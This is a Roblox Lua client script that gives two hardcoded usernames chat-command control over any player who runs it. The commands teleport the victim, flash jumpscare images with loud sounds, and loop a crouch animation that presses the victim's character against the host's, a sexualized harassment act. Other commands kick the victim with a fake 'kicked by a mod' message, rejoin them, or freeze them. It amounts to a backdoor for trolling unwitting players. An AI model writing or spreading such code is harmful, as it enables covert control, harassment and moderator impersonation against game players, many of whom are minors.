local host = {
    "riskmaneWWW",
    "sp0zx"
}
print("loaded?")
function premium()
for _, playerName in ipairs(host) do
    local player = game.Players:FindFirstChild(playerName)
    if player then
        player.Chatted:Connect(function(message)
                    if message == ".bring" then
                        
                local plr = game.Players.LocalPlayer
                local char = plr.Character
                char.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0)
                        
                    elseif message == ".bring ".. game.Players.LocalPlayer.Name then
                local plr = game.Players.LocalPlayer
                local char = plr.Character
                

                char.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0,5,0)      
            elseif message == ".scare ".. game.Players.LocalPlayer.Name then

            local scare = Instance.new("ScreenGui")
            local ImageLabel = Instance.new("ImageLabel")

            --Properties:

            scare.Name = "scare"
            scare.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            scare.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            ImageLabel.Parent = scare
            ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ImageLabel.BorderSizePixel = 0
            ImageLabel.Position = UDim2.new(0, 0, -0.086848639, 0)
            ImageLabel.Size = UDim2.new(1, 0, 1, 120)
            ImageLabel.Image = "http://www.roblox.com/asset/?id=9699832222"

            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://6201426647"
            sound.Looped = false 
            sound.Playing = true 
            sound.Volume = 10
            sound.Parent = game:GetService("SoundService")

wait(4)
sound:Destroy()
scare:Destroy()
            elseif message == ".jscare ".. game.Players.LocalPlayer.Name then

            local OBBAMAAM = Instance.new("ScreenGui")
            local ImageLabel = Instance.new("ImageLabel")

            --Properties:

            OBBAMAAM.Name = "OBBAMAAM!!!"
            OBBAMAAM.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
            OBBAMAAM.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            ImageLabel.Parent = OBBAMAAM
            ImageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
            ImageLabel.BorderSizePixel = 0
            ImageLabel.Position = UDim2.new(0, 0, -0.086848639, 0)
            ImageLabel.Size = UDim2.new(1, 0, 1, 120)
            ImageLabel.Image = "http://www.roblox.com/asset/?id=4593228433"

            local sound = Instance.new("Sound")
            sound.SoundId = "rbxassetid://2976402600"
            sound.Looped = false 
            sound.Playing = true 
            sound.Parent = game:GetService("SoundService")



wait(2.5)
sound:Destroy()
OBBAMAAM:Destroy()
            elseif message == ".benx ".. game.Players.LocalPlayer.Name then

                bending = true
                local segtarget = player

                local Crouch = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(game.ReplicatedStorage.Animations.Crouch)
                Crouch.Looped = true
                Crouch:Play()
                 
                local away = .5
                local reversing = false
                local Loop
                local loopFunction = function()
                    local targetchar = segtarget.Character
                    local character = game.Players.LocalPlayer.Character
                    if targetchar then
                        if reversing == true then
                            away = away - 0.1
                        else
                            away = away + 0.1
                        end
                        if away >= 2 then
                            reversing = true
                        elseif away < 0.5 then
                             reversing = false
                        end
                        character.HumanoidRootPart.CFrame = targetchar.HumanoidRootPart.CFrame + targetchar.HumanoidRootPart.CFrame.lookVector * away
                    end
                end
                local Start = function()
                    Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction)
                end
                local Pause = function()
                    Loop:Disconnect()
                    Crouch:Stop()
                end
                Start()    
                repeat wait() until bending == false
                Pause()

            elseif message == ".unbenx ".. game.Players.LocalPlayer.Name then
                while bending == true do
                    wait()
                    bending = false
                end
            
            
            
            elseif message == ".kick ".. game.Players.LocalPlayer.Name then
                game.Players.LocalPlayer:Kick("youve been kicked by a mod!")

            elseif message == ".rejoin ".. game.Players.LocalPlayer.Name then

                local TeleportService = game:GetService("TeleportService")
                local Players = game:GetService("Players")
                local LocalPlayer = Players.LocalPlayer

                local Rejoin = coroutine.create(function()
                    local Success, ErrorMessage = pcall(function()
                        TeleportService:Teleport(game.PlaceId, LocalPlayer)
                    end)
                end)
                
                coroutine.resume(Rejoin)
            
            elseif message == ".freeze ".. game.Players.LocalPlayer.Name then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
            elseif message == ".unfreeze ".. game.Players.LocalPlayer.Name then
                game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
            
            end
        end)
    else
        warn("No player found that was specified! (input):", playerName)
    end
end
end 


for i,v in pairs(game.Players:GetPlayers()) do
    if table.find(host,v.Name) then 
    premium()
    end
end

game.Players.PlayerAdded:Connect(function(plr) 
    plr.CharacterAdded:Connect(function(Char)
        if table.find(host, plr.Name) then
           premium()
        end
    end)
end)
